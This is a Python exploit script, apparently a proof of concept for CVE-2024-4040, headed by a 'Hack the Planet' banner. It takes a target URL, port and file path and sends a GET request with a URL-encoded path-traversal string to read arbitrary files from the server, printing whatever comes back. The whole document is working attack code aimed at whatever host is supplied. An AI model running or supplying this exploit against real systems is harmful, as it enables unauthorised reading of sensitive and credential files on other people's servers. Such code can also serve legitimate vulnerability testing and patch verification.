import requests
import argparse
import sys

import urllib3

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art 
    
def exploit(targetUrl, targetPort,targetFile):
    
    
    finalUrl = f"{targetUrl}:{targetPort}/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..{targetFile}"
    
    # Make the GET request
    response = requests.get(finalUrl)

    # Check if the request was successful
    if response.status_code == 200:
        print("Request was successful!!!! \n")
        print("Response content: \n")
        print(response.text)
    
    else:
        print("Target might not be vulnerable...")
        sys.exit("Exiting..")


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-4040")
    parser.add_argument("-u", '--targetUrl', required=True, help="The target URL")
    parser.add_argument("-p", '--targetPort', required=True, help="The target Port")
    parser.add_argument("-f", '--targetFile', required=True, help="The target file to read")
    args = parser.parse_args()
    try:
        ascii()
        return(exploit(args.targetUrl, args.targetPort, args.targetFile))
            
    except Exception:
        sys.exit("Some error occured..")
        
if __name__ == "__main__":
    main()
